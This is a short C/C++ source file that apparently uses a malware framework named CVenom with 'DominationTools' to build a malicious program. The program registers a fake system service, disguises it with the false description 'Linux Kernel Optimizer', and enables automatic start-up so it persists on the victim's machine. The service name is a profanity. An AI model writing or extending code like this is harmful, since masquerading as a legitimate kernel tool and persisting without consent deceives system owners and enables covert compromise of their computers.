#include "../../CVenom.h"
#include "../../DominationTools.h"

int main(MALWARE_ENTRY){
	cvinit(MALWARE_INIT);

	SetMalwareFakeService("sadmotherfucker");
	SetMalwareFakeDescription("Linux Kernel Optimizer");


	DominationTools Dom;
	Dom.EnableAutoStart();

	cvexit(MALWARE_EXIT);
}
